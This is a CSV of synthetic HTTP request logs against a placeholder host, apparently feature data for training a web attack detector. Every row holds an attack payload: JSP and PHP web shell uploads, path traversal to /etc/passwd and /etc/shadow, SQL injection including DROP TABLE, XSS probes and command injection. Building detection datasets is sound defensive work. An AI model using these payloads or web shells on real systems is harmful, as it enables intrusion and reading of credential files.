timestamp,client_ip,method,url,path,body,body_len,body_entropy,special_char_count,path_depth,query_length,has_file_upload,response_status,response_length
2025-01-02T04:13:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.95,22,1,85,1,200,1307
2025-01-02T04:14:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,4.97,7,1,25,0,302,373
2025-01-02T04:15:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,5.92,2,1,11,0,302,580
2025-01-02T04:16:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,3.93,22,1,85,1,403,1528
2025-01-02T04:17:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,4.78,13,1,22,0,302,700
2025-01-02T04:18:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,3.8,13,1,22,0,500,1036
2025-01-02T04:19:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.82,22,1,85,1,403,1461
2025-01-02T04:20:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,3.83,13,1,22,0,302,1340
2025-01-02T04:21:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,5.58,10,1,27,0,500,1567
2025-01-02T04:22:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,5.6,3,1,15,0,200,414
2025-01-02T04:23:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,4.24,13,1,22,0,403,908
2025-01-02T04:24:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,4.09,6,1,21,0,200,270
2025-01-02T04:25:00Z,offline,GET,http://test/xss?q=<img src=x onerror=alert(1)>,/xss,<img src=x onerror=alert(1)>,28,3.53,8,1,28,0,200,873
2025-01-02T04:26:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,4.36,7,1,11,0,200,576
2025-01-02T04:27:00Z,offline,GET,http://test/search?q=' UNION SELECT null--,/search,' UNION SELECT null--,21,3.61,6,1,21,0,200,374
2025-01-02T04:28:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,3.54,2,1,11,0,500,477
2025-01-02T04:29:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,3.97,6,1,22,0,302,731
2025-01-02T04:30:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,5.4,3,1,18,0,500,1201
2025-01-02T04:31:00Z,offline,GET,http://test/cmd?q=whoami,/cmd,whoami,6,4.79,0,1,6,0,403,1171
2025-01-02T04:32:00Z,offline,GET,http://test/search?q=' UNION SELECT null--,/search,' UNION SELECT null--,21,4.01,6,1,21,0,500,1033
2025-01-02T04:33:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,3.63,7,1,11,0,403,623
2025-01-02T04:34:00Z,offline,GET,http://test/xss?q=<img src=x onerror=alert(1)>,/xss,<img src=x onerror=alert(1)>,28,6.31,8,1,28,0,403,695
2025-01-02T04:35:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,4.3,19,1,55,1,500,1140
2025-01-02T04:36:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,6.25,22,1,85,1,500,248
2025-01-02T04:37:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,5.48,3,1,18,0,403,1581
2025-01-02T04:38:00Z,offline,GET,http://test/cmd?q=whoami,/cmd,whoami,6,5.27,0,1,6,0,302,1264
2025-01-02T04:39:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,4.97,7,1,33,0,302,796
2025-01-02T04:40:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,4.9,19,1,55,1,302,316
2025-01-02T04:41:00Z,offline,GET,http://test/cmd?q=ls;,/cmd,ls;,3,4.73,1,1,3,0,500,301
2025-01-02T04:42:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.73,22,1,85,1,500,234
2025-01-02T04:43:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,3.91,22,1,85,1,500,1225
2025-01-02T04:44:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,6.36,7,1,11,0,403,344
2025-01-02T04:45:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,5.95,13,1,22,0,302,1195
2025-01-02T04:46:00Z,offline,GET,http://test/cmd?q=id,/cmd,id,2,5.11,0,1,2,0,302,1191
2025-01-02T04:47:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,5.55,7,1,11,0,200,656
2025-01-02T04:48:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,3.7,13,1,22,0,403,342
2025-01-02T04:49:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,4.93,2,1,11,0,302,1033
2025-01-02T04:50:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,6.42,3,1,8,0,500,487
2025-01-02T04:51:00Z,offline,GET,http://test/cmd?q=id,/cmd,id,2,4.28,0,1,2,0,302,231
2025-01-02T04:52:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.77,22,1,85,1,302,1281
2025-01-02T04:53:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,4.82,22,1,85,1,302,1519
2025-01-02T04:54:00Z,offline,GET,http://test/cmd?q=whoami,/cmd,whoami,6,4.03,0,1,6,0,403,1234
2025-01-02T04:55:00Z,offline,GET,http://test/cmd?q=ls;,/cmd,ls;,3,4.94,1,1,3,0,200,363
2025-01-02T04:56:00Z,offline,GET,http://test/cmd?q=ls;,/cmd,ls;,3,3.87,1,1,3,0,200,731
2025-01-02T04:57:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,3.87,6,1,21,0,302,1540
2025-01-02T04:58:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,4.86,10,1,27,0,500,984
2025-01-02T04:59:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,3.56,3,1,8,0,500,949
2025-01-02T05:00:00Z,offline,GET,http://test/cmd?q=ping -c 4 127.0.0.1,/cmd,ping -c 4 127.0.0.1,19,4.42,7,1,19,0,302,1571
2025-01-02T05:01:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,6.1,19,1,55,1,500,1439
2025-01-02T05:02:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,3.95,6,1,21,0,200,728
2025-01-02T05:03:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,3.57,3,1,8,0,302,823
2025-01-02T05:04:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,5.0,3,1,15,0,403,682
2025-01-02T05:05:00Z,offline,GET,http://test/cmd?q=ping -c 4 127.0.0.1,/cmd,ping -c 4 127.0.0.1,19,3.97,7,1,19,0,500,1000
2025-01-02T05:06:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,4.38,22,1,85,1,200,407
2025-01-02T05:07:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,6.29,2,1,11,0,403,240
2025-01-02T05:08:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,4.56,7,1,33,0,403,1300
2025-01-02T05:09:00Z,offline,GET,http://test/cmd?q=ping -c 4 127.0.0.1,/cmd,ping -c 4 127.0.0.1,19,5.88,7,1,19,0,200,1077
2025-01-02T05:10:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,6.47,22,1,85,1,500,484
2025-01-02T05:11:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,5.76,3,1,15,0,302,1062
2025-01-02T05:12:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,5.82,19,1,55,1,302,1331
2025-01-02T05:13:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.46,22,1,85,1,302,362
2025-01-02T05:14:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,6.31,2,1,11,0,403,264
2025-01-02T05:15:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,5.81,7,1,11,0,302,1416
2025-01-02T05:16:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,4.35,19,1,55,1,500,601
2025-01-02T05:17:00Z,offline,GET,http://test/xss?q=<img src=x onerror=alert(1)>,/xss,<img src=x onerror=alert(1)>,28,4.8,8,1,28,0,302,203
2025-01-02T05:18:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,6.05,13,1,22,0,200,1137
2025-01-02T05:19:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,4.63,10,1,27,0,403,1383
2025-01-02T05:20:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.62,22,1,85,1,403,1583
2025-01-02T05:21:00Z,offline,GET,http://test/cmd?q=whoami,/cmd,whoami,6,4.85,0,1,6,0,200,585
2025-01-02T05:22:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,3.51,19,1,55,1,200,975
2025-01-02T05:23:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,4.46,3,1,8,0,302,1109
2025-01-02T05:24:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,5.07,10,1,27,0,403,1390
2025-01-02T05:25:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,4.86,7,1,33,0,403,495
2025-01-02T05:26:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,6.19,10,1,27,0,302,377
2025-01-02T05:27:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,5.11,3,1,8,0,500,652
2025-01-02T05:28:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,5.06,13,1,22,0,403,1459
2025-01-02T05:29:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,4.73,22,1,85,1,200,439
2025-01-02T05:30:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,6.25,2,1,11,0,500,1511
2025-01-02T05:31:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.64,22,1,85,1,403,1532
2025-01-02T05:32:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,4.44,22,1,85,1,302,1116
2025-01-02T05:33:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,5.2,19,1,55,1,403,1235
2025-01-02T05:34:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,4.25,3,1,18,0,500,613
2025-01-02T05:35:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,4.13,3,1,8,0,200,1139
2025-01-02T05:36:00Z,offline,GET,http://test/cmd?q=ls;,/cmd,ls;,3,3.54,1,1,3,0,403,460
2025-01-02T05:37:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,6.25,10,1,27,0,403,688
2025-01-02T05:38:00Z,offline,GET,http://test/cmd?q=whoami,/cmd,whoami,6,5.91,0,1,6,0,200,1415
2025-01-02T05:39:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,4.22,19,1,55,1,200,480
2025-01-02T05:40:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,4.09,2,1,11,0,500,1391
2025-01-02T05:41:00Z,offline,GET,http://test/cmd?q=id,/cmd,id,2,6.12,0,1,2,0,500,318
2025-01-02T05:42:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,4.69,10,1,27,0,500,247
2025-01-02T05:43:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,6.03,10,1,27,0,403,871
2025-01-02T05:44:00Z,offline,GET,http://test/xss?q=<img src=x onerror=alert(1)>,/xss,<img src=x onerror=alert(1)>,28,6.08,8,1,28,0,302,1587
2025-01-02T05:45:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,4.11,3,1,8,0,302,846
2025-01-02T05:46:00Z,offline,GET,http://test/cmd?q=whoami,/cmd,whoami,6,4.55,0,1,6,0,302,667
2025-01-02T05:47:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,5.11,7,1,25,0,500,1172
2025-01-02T05:48:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,6.21,10,1,27,0,403,521
2025-01-02T05:49:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,4.49,6,1,22,0,500,946
2025-01-02T05:50:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,5.86,7,1,11,0,302,441
2025-01-02T05:51:00Z,offline,GET,http://test/xss?q=<img src=x onerror=alert(1)>,/xss,<img src=x onerror=alert(1)>,28,6.31,8,1,28,0,200,1527
2025-01-02T05:52:00Z,offline,GET,http://test/xss?q=<img src=x onerror=alert(1)>,/xss,<img src=x onerror=alert(1)>,28,4.45,8,1,28,0,200,406
2025-01-02T05:53:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,3.89,22,1,85,1,200,804
2025-01-02T05:54:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,6.13,7,1,33,0,200,1018
2025-01-02T05:55:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,5.92,3,1,18,0,403,635
2025-01-02T05:56:00Z,offline,GET,http://test/search?q=' UNION SELECT null--,/search,' UNION SELECT null--,21,5.44,6,1,21,0,403,250
2025-01-02T05:57:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,4.91,22,1,85,1,200,1381
2025-01-02T05:58:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,6.34,2,1,11,0,500,637
2025-01-02T05:59:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,3.83,7,1,11,0,200,1567
2025-01-02T06:00:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.84,22,1,85,1,200,729
2025-01-02T06:01:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,5.65,13,1,22,0,403,929
2025-01-02T06:02:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.79,22,1,85,1,200,1147
2025-01-02T06:03:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,6.19,6,1,22,0,200,1553
2025-01-02T06:04:00Z,offline,GET,http://test/cmd?q=id,/cmd,id,2,5.02,0,1,2,0,403,1048
2025-01-02T06:05:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,4.13,10,1,27,0,403,744
2025-01-02T06:06:00Z,offline,GET,http://test/cmd?q=id,/cmd,id,2,6.5,0,1,2,0,200,664
2025-01-02T06:07:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,5.5,6,1,22,0,302,704
2025-01-02T06:08:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,4.44,22,1,85,1,500,344
2025-01-02T06:09:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,4.54,19,1,55,1,200,1236
2025-01-02T06:10:00Z,offline,GET,http://test/cmd?q=ping -c 4 127.0.0.1,/cmd,ping -c 4 127.0.0.1,19,4.7,7,1,19,0,500,1554
2025-01-02T06:11:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,5.32,6,1,22,0,200,1357
2025-01-02T06:12:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,4.35,22,1,85,1,200,1195
2025-01-02T06:13:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,4.32,7,1,11,0,403,273
2025-01-02T06:14:00Z,offline,GET,http://test/search?q=' UNION SELECT null--,/search,' UNION SELECT null--,21,4.64,6,1,21,0,403,1576
2025-01-02T06:15:00Z,offline,GET,http://test/cmd?q=id,/cmd,id,2,3.62,0,1,2,0,403,551
2025-01-02T06:16:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,5.48,10,1,27,0,200,385
2025-01-02T06:17:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,4.86,19,1,55,1,500,831
2025-01-02T06:18:00Z,offline,GET,http://test/search?q=' UNION SELECT null--,/search,' UNION SELECT null--,21,6.49,6,1,21,0,200,367
2025-01-02T06:19:00Z,offline,GET,http://test/search?q=' UNION SELECT null--,/search,' UNION SELECT null--,21,4.31,6,1,21,0,200,1042
2025-01-02T06:20:00Z,offline,GET,http://test/cmd?q=id,/cmd,id,2,4.33,0,1,2,0,200,677
2025-01-02T06:21:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,3.82,3,1,15,0,500,1464
2025-01-02T06:22:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,3.54,7,1,33,0,403,480
2025-01-02T06:23:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,3.81,2,1,11,0,403,381
2025-01-02T06:24:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,5.12,7,1,11,0,200,398
2025-01-02T06:25:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,4.73,7,1,25,0,302,785
2025-01-02T06:26:00Z,offline,GET,http://test/cmd?q=whoami,/cmd,whoami,6,5.89,0,1,6,0,302,1063
2025-01-02T06:27:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,5.61,6,1,21,0,200,1226
2025-01-02T06:28:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,4.29,3,1,8,0,500,1179
2025-01-02T06:29:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,3.9,7,1,11,0,500,1529
2025-01-02T06:30:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,6.03,13,1,22,0,403,1512
2025-01-02T06:31:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,5.11,19,1,55,1,403,1333
2025-01-02T06:32:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,4.1,2,1,11,0,200,349
2025-01-02T06:33:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,5.21,10,1,27,0,302,778
2025-01-02T06:34:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,5.13,13,1,22,0,200,699
2025-01-02T06:35:00Z,offline,GET,http://test/cmd?q=whoami,/cmd,whoami,6,5.71,0,1,6,0,403,1258
2025-01-02T06:36:00Z,offline,GET,http://test/cmd?q=id,/cmd,id,2,5.33,0,1,2,0,403,290
2025-01-02T06:37:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,4.07,7,1,11,0,500,651
2025-01-02T06:38:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,4.35,3,1,15,0,500,801
2025-01-02T06:39:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,5.46,2,1,11,0,302,405
2025-01-02T06:40:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,3.89,10,1,27,0,403,795
2025-01-02T06:41:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,6.42,7,1,11,0,302,479
2025-01-02T06:42:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,6.3,7,1,25,0,403,1503
2025-01-02T06:43:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,4.14,6,1,21,0,200,323
2025-01-02T06:44:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,6.44,10,1,27,0,302,527
2025-01-02T06:45:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.22,22,1,85,1,403,966
2025-01-02T06:46:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,5.93,6,1,22,0,500,389
2025-01-02T06:47:00Z,offline,GET,http://test/search?q=' UNION SELECT null--,/search,' UNION SELECT null--,21,3.56,6,1,21,0,200,1546
2025-01-02T06:48:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,4.58,7,1,11,0,200,550
2025-01-02T06:49:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,5.33,3,1,8,0,500,963
2025-01-02T06:50:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,6.17,7,1,11,0,403,1062
2025-01-02T06:51:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,3.65,13,1,22,0,500,1173
2025-01-02T06:52:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,5.32,10,1,27,0,302,315
2025-01-02T06:53:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,5.81,2,1,11,0,500,541
2025-01-02T06:54:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,4.59,6,1,21,0,200,832
2025-01-02T06:55:00Z,offline,GET,http://test/cmd?q=ping -c 4 127.0.0.1,/cmd,ping -c 4 127.0.0.1,19,5.05,7,1,19,0,403,1043
